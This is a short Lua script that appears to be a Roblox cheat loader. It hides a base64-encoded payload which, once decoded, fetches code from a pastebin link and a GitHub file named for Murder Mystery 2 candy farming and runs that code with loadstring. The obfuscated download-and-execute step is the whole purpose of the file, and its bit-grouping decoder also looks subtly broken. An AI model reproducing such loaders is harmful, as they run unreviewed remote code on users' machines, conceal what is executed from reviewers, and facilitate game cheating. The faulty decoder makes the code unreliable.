local function decodeBase64(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = data:gsub('[^' .. b .. '=]', '')

    return (data:gsub('.', function(x)
        if x == '=' then return '' end
        local r, f = '', b:find(x) - 1
        for i = 6, 1, -1 do
            r = r .. (f % 2^i - f % 2^(i - 1) > 0 and '1' or '0')
        end
        return r
    end):gsub('%d%d%d', function(x)
        return string.char(tonumber(x, 2))
    end))
end

local encoded_script = "bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9kZ1N2NHkzUSIpKSgpIA0KbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS92ZXhyb3hkL015LVNjcmlwdC0vcmVmcy9oZWFkcy9tYWluL01NMi1DYW5keS1GYXJtIikpKCk="

local decoded_script = decodeBase64(encoded_script)

loadstring(decoded_script)()
